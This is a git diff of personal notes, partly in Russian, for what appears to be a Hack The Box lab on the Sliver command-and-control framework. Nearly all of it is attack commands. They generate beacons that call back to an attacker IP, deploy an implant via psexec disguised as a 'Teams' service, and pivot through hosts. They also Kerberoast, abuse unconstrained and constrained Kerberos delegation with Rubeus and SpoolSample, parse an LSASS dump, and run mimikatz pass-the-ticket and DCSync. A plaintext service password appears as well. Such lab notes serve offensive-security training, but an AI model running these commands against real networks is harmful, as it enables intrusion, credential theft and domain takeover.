@@ -75,9 +75,50 @@ Sliver
     inline-execute-assembly /home/htb-ac590/Rubeus.exe 'kerberoast /format:hashcat /user:alice /nowrap'
     inline-execute-assembly /home/htb-ac590/Rubeus.exe 'asreproast /format:hashcat /user:bob /nowrap'
     
-# Impersonation
+# Impersonation and Lateral Movement
+    Создание токена пользователя (runas)
 
+    generate --http 10.10.16.14:9001 --skip-symbols --os windows -N http-beacon-9001
 
+    http -L 10.10.16.14 -l 9001
+
+    use session/beacon
+
+    make-token -u svc_sql -d child.htb.local -p jkhnrjk123!
+    биндим с удаленки на на наш средний сервер
+    pivots tcp --bind 172.16.1.11 (запускаем слушатель на пой промежуточный хост)
+    генерейтим бекон/servise
+    generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivot
+    Jumping into the psexec utility, we must specify the path of the implant's binary.
+    psexec --custom-exe /home/htb-ac590/psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams srv01.child.htb.local (Запускаем бекон через psexec)
+    мы оказываеися не хосте
+    sessions
+    pivot
+
+# Kerberos Delegation
+# Unconstrained Delegation
+    rportfwd add -b 8080 -r 127.0.0.1:8080 (реверс порт форвардинг на средний хост)
+
+    mxdelta@htb[/htb]$ echo "Get-NetComputer -Unconstrained" | base64 
+    R2V0LU5ldENvbXB1dGVyIC1VbmNvbnN0cmFpbmVkCg==
+    harpsh -- '-u http://172.16.1.11:8080/PowerView.ps1 -e -c R2V0LU5ldENvbXB1dGVyIC1VbmNvbnN0cmFpbmVkCg=='
+
+    proxychains impacket-psexec child/svc_sql:jkhnrjk123\!@172.16.1.12
+    PS C:\Windows\tasks> .\Rubeus.exe monitor /interval:5 /nowrap
+
+    sliver (psexec-pivot) > inline-execute-assembly /home/htb-ac590/SpoolSample.exe 'dc01 srv01'
+    PS C:\Windows\system32> [System.IO.File]::WriteAllBytes("C:\windows\temp\dc01.kirbi",[System.Convert]::FromBase64String("doIFJjCCBSKgA <SNIP> Q0hJTEQuSFRCLkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw9DSElMRC5IVEIuTE9DQUw="))
+    C:\Windows\Tasks>.\mimikatz.exe "privilege::debug" "kerberos::ptt C:\windows\temp\dc01.kirbi" "lsadump::dcsync /domain:child.htb.local /user:child\administrator" "exit"
+
+# Constrained Delegation
+    sharpview Get-NetComputer -TrustedToAuth
+    
+    mxdelta@htb[/htb]$ python3 -m pypykatz lsa minidump web01-lsass
+
+    inline-execute-assembly /home/htb-ac-1008/Rubeus.exe 'asktgt /user:web01$ /rc4:021b6a0d0e0ca246ec266bb72a481bc6 /nowrap'
+
+    nline-execute-assembly /home/htb-ac-1008/Rubeus.exe 's4u /impersonateuser:carrot /msdsspn:eventsystem/srv02.child.htb.local /user:web01$ /ticket:doIE8DCCBOygAwIBBaEDAgEWoo<SNIP>sZC5odGIubG9jYWw= /nowrap'
+    ls //srv02.child.htb.local/c$
 
     
 
